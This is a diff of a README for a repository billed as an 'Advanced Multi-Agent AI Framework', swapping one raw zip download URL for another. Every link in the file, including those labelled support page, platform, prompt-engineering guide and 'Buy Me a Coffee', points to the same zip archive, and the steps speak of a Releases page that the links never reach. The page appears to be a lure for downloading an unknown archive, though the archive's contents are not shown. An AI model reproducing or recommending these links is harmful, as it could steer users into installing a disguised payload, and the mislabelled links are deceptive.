@@ -1,7 +1,7 @@
 # 🎉 Advanced-Multi-Agent-AI-Framework - Simplifying AI Team Management
 
 ## 🚀 Download Now
-[![Download Here](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)
+[![Download Here](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip%20Now-Release%20Page-blue)](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)
 
 ## 📖 Introduction
 The Advanced Multi-Agent AI Framework streamlines team coordination in AI development. This tool offers over 80 prompt engineering techniques to enhance your workflow and improve overall productivity.
@@ -26,7 +26,7 @@ To use the Advanced Multi-Agent AI Framework, ensure your system meets the follo
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software:
 
-[Download Here](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)
+[Download Here](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)
 
 1. Click the link above to access the Releases page.
 2. Choose the latest release version.
@@ -65,17 +65,17 @@ Once installed, open the application to begin your journey with advanced AI mana
 ### Support and Community
 For assistance, you can:
 
-- Visit our **[Support Page](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)** for FAQs and common issues.
+- Visit our **[Support Page](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)** for FAQs and common issues.
 - Join our **community forum** for tips, discussions, and user experiences.
 
 ## 🔗 Quick Links
-- [Kilo Code Platform](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)
-- [Master Prompt Engineering Techniques](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)
+- [Kilo Code Platform](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)
+- [Master Prompt Engineering Techniques](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)
 
 ## 🙏 Support This Work
 If this project helps you build better AI systems and you'd like to show your appreciation:
 
-- **Buy Me a Coffee**: [Support Here](https://raw.githubusercontent.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/main/commentary/Advanced-Multi-Agent-AI-Framework.zip)
+- **Buy Me a Coffee**: [Support Here](https://github.com/BEHZAD1919/Advanced-Multi-Agent-AI-Framework/raw/refs/heads/main/meet-the-team/Multi-Framework-Advanced-A-Agent-v3.3.zip)
 
 ## 🛠 Future Updates
 Stay tuned for upcoming features, improvements, and more prompt engineering techniques to enhance your project.
